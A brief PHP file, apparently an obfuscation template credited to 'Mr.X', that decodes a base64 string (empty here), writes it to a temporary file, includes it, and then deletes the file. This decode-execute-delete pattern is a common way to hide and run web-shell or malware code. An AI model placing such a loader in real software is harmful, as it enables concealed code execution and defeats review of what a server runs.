<?php
/* Obfuscated by Mr.X*/

// Decode base64 dan simpan ke file sementara
$decoded = base64_decode("");
$temp_file = tempnam(sys_get_temp_dir(), 'obf_');
file_put_contents($temp_file, $decoded);

// Menjalankan file PHP sementara
include($temp_file);
unlink($temp_file); // Hapus file sementara setelah dieksekusi
?>
